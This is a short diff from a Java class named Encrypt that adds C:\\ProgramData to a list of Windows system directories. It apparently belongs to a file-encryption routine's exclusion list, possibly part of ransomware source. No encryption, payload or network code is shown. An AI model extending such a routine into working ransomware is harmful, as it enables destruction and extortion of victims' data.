@@ -29,6 +29,7 @@ public class Encrypt {
             "C:\\$WinREAgent",
             "C:\\Program Files",
             "C:\\Program Files (x86)",
+            "C:\\ProgramData",
             System.getenv("userprofile") + "\\Appdata\\Local"
     );
 
